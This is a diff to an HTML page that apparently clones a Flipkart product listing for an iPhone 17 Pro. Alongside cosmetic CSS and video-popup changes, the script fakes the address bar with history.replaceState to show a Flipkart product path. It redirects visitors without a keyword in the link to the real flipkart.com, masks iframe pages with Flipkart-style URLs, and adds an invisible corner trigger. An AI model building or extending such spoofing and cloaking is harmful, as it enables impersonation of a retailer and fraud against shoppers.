@@ -86,6 +86,7 @@
     cursor: pointer;
     background: none;
     border: none;
+    text-decoration: none;
   }
   .header-icon-btn:active { background: #f1f5f9; }
 
@@ -136,23 +137,23 @@
     width: 100%;
     height: 100%;
     object-fit: cover;
-    opacity: 0.9;
+    opacity: 0.92;
   }
   .play-circle-btn {
     position: absolute;
     width: 60px;
     height: 60px;
-    background: rgba(255, 0, 0, 0.9);
+    background: #ff0000;
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
     color: #ffffff;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.35);
+    box-shadow: 0 4px 18px rgba(0,0,0,0.4);
     transition: transform 0.2s ease;
   }
   .play-circle-btn svg { margin-left: 3px; }
-  .video-slide-container:active .play-circle-btn { transform: scale(0.9); }
+  .video-slide-container:active .play-circle-btn { transform: scale(0.92); }
 
   /* Bottom-Left Rating Badge on Image */
   .image-rating-badge {
@@ -223,7 +224,7 @@
     color: var(--text-secondary);
   }
 
-  /* Dividers */
+  /* Section Dividers */
   .section-divider {
     height: 8px;
     background: var(--bg-page);
@@ -331,7 +332,7 @@
     left: 0;
     right: 0;
     height: 55%;
-    background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.85) 50%, #ffffff 100%);
+    background: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.88) 50%, #ffffff 100%);
     display: flex;
     align-items: flex-end;
     justify-content: center;
@@ -348,6 +349,7 @@
     cursor: pointer;
     box-shadow: 0 4px 12px rgba(40,116,240,0.25);
   }
+  .showcase-btn:active { opacity: 0.9; }
 
   /* Tab 2: Specifications */
   .specs-collapsible-wrapper {
@@ -424,7 +426,7 @@
     font-weight: 600;
   }
 
-  /* Ads Slider Section under Tab Content */
+  /* 3 Ads Carousel Section */
   .ads-section {
     padding: 14px 16px;
     background: #ffffff;
@@ -513,7 +515,7 @@
     color: #ffffff;
   }
 
-  /* YouTube Video Popup Modal */
+  /* Video Popup Modal */
   .video-modal-backdrop {
     position: fixed;
     inset: 0;
@@ -534,32 +536,40 @@
     overflow: hidden;
     position: relative;
     box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-    aspect-ratio: 16 / 9;
   }
-  .video-modal-box iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
+  .video-modal-header {
+    display: flex;
+    justify-content: flex-end;
+    padding: 8px 12px;
+    background: #111827;
   }
   .video-close-btn {
-    position: absolute;
-    top: -46px;
-    right: 0;
-    width: 36px;
-    height: 36px;
-    background: rgba(0, 0, 0, 0.7);
+    background: rgba(255, 255, 255, 0.2);
     color: #ffffff;
     border: none;
     border-radius: 50%;
-    font-size: 18px;
+    width: 28px;
+    height: 28px;
+    font-size: 16px;
     font-weight: bold;
     cursor: pointer;
     display: flex;
     align-items: center;
     justify-content: center;
+    transition: background 0.15s ease;
+  }
+  .video-close-btn:active { background: rgba(255, 255, 255, 0.4); }
+  .video-iframe-wrapper {
+    width: 100%;
+    aspect-ratio: 16 / 9;
+  }
+  .video-iframe-wrapper iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
   }
 
-  /* Scroll-up Reviews Overlay Bottom-Sheet */
+  /* Reviews Bottom-Sheet */
   .sheet-backdrop {
     position: fixed;
     inset: 0;
@@ -712,10 +722,10 @@
         <img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/5/i/n/-original-imahft5ndwfkx6ez.jpeg?q=90" alt="iPhone 17 Pro">
       </div>
 
-      <!-- 2. Video Slide with YouTube's Own Thumbnail and Closeable Popup -->
+      <!-- 2. Video Slide with YouTube's Official Video Thumbnail and Closeable Popup -->
       <div class="carousel-slide">
         <div class="video-slide-container" onclick="openVideoModal('https://www.youtube-nocookie.com/embed/FAbwR58dNHo?autoplay=1&playsinline=1&modestbranding=1&rel=0')">
-          <img src="https://img.youtube.com/vi/FAbwR58dNHo/hqdefault.jpg" alt="YouTube Video Thumbnail">
+          <img src="https://i.ytimg.com/vi/FAbwR58dNHo/hqdefault.jpg" onerror="this.src='https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/q/s/s/-original-imahft5nxa9wukz8.jpeg?q=90'" alt="YouTube Video Thumbnail">
           <div class="play-circle-btn">
             <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor">
               <path d="M8 5v14l11-7z"/>
@@ -1053,11 +1063,15 @@
   </div>
 </div>
 
-<!-- Video Popup Modal -->
-<div class="video-modal-backdrop" id="videoModal">
-  <div class="video-modal-box">
-    <button class="video-close-btn" onclick="closeVideoModal()">✕</button>
-    <iframe id="videoModalFrame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+<!-- Video Popup Modal with Close Button inside Header -->
+<div class="video-modal-backdrop" id="videoModal" onclick="closeVideoModal(event)">
+  <div class="video-modal-box" onclick="event.stopPropagation()">
+    <div class="video-modal-header">
+      <button class="video-close-btn" onclick="closeVideoModal()" title="Close Video">✕</button>
+    </div>
+    <div class="video-iframe-wrapper">
+      <iframe id="videoModalFrame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
   </div>
 </div>
 
@@ -1110,21 +1124,32 @@
   <iframe id="appFrame" src="about:blank"></iframe>
 </div>
 
-<!-- Invisible Trigger in Top-Left Corner to Return to product view -->
+<!-- Invisible Trigger in Top-Left Corner to Return to Custom Product URL inside index.html -->
 <div id="invisibleRefreshTrigger" onclick="handleInvisibleTrigger()" title="Back to Product"></div>
 
 <script>
-  // Dynamic Product URL Template
+  // Normalized Target Product URL Path
   const PRODUCT_URL_PATH = '/apple-iphone-17-pro-deep-blue-256-gb/p/itm76fe37ca9ea8c';
+  const VERIFY_KEYWORD = 'apple-iphone-17-pro-deep-blue-256';
 
-  // URL Verification and Initialization Logic
-  (function initUrlVerification() {
-    const currentPath = window.location.pathname + window.location.search;
-    // Check if the current URL contains the target product slug
-    if (!currentPath.includes('apple-iphone-17-pro-deep-blue-256')) {
+  // URL Verification and Routing Logic inside index.html
+  (function verifyAndInitializeRoute() {
+    const fullHref = window.location.href;
+    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:';
+
+    // Verify if the link contains the required product slug
+    if (fullHref.includes(VERIFY_KEYWORD)) {
+      try {
+        // Accept and cleanly normalize address bar to the custom product link
+        window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
+      } catch(e) {}
+    } else if (!isLocal) {
+      // If someone visits direct domain or wrong link on production without the key, redirect to flipkart.com
+      window.location.replace('https://www.flipkart.com');
+    } else {
       try {
         window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
-      } catch(err) {}
+      } catch(e) {}
     }
   })();
 
@@ -1149,7 +1174,7 @@
     }
   }
 
-  // Video Popup Logic (With close button & auto pause)
+  // Video Popup Logic with instant pause on close
   function openVideoModal(videoUrl) {
     const modal = document.getElementById('videoModal');
     const iframe = document.getElementById('videoModalFrame');
@@ -1160,11 +1185,11 @@
   function closeVideoModal() {
     const modal = document.getElementById('videoModal');
     const iframe = document.getElementById('videoModalFrame');
-    iframe.src = ''; // Stops/pauses video
+    iframe.src = ''; // Stops playback instantly
     modal.style.display = 'none';
   }
 
-  // Reviews Bottom-Sheet Overlay
+  // Reviews Bottom-Sheet Scroll-up Overlay
   function openReviewsSheet() {
     const sheet = document.getElementById('reviewsSheet');
     sheet.style.display = 'flex';
@@ -1177,7 +1202,7 @@
     setTimeout(() => { sheet.style.display = 'none'; }, 300);
   }
 
-  // Full-Page Iframe Handler with Custom URL Tag: flipkart.com-[pagename]-[random]
+  // Full-Page Iframe Handler with Custom URL Mask: flipkart.com-[pagename]-[random]
   function openInIframe(e, url, pageName = 'page') {
     if (e && e.preventDefault) e.preventDefault();
     closeReviewsSheet();
@@ -1201,7 +1226,7 @@
     }
   }
 
-  // Invisible Trigger Action (Closes iframe and restores Product URL)
+  // Invisible Trigger Action: Closes iframe and cleanly restores custom product URL inside index.html
   function handleInvisibleTrigger() {
     const overlay = document.getElementById('iframeOverlay');
     const frame = document.getElementById('appFrame');
@@ -1252,6 +1277,7 @@
   }
 
   function startAdTimer() {
+    clearInterval(adInterval);
     updateAdProgress();
     adInterval = setInterval(() => {
       currentAd = (currentAd + 1) % totalAds;
@@ -1267,7 +1293,6 @@
     const activeIndex = Math.round(adsTrack.scrollLeft / slideWidth);
     if (activeIndex !== currentAd && activeIndex < totalAds) {
       currentAd = activeIndex;
-      clearInterval(adInterval);
       startAdTimer();
     }
   }, { passive: true });
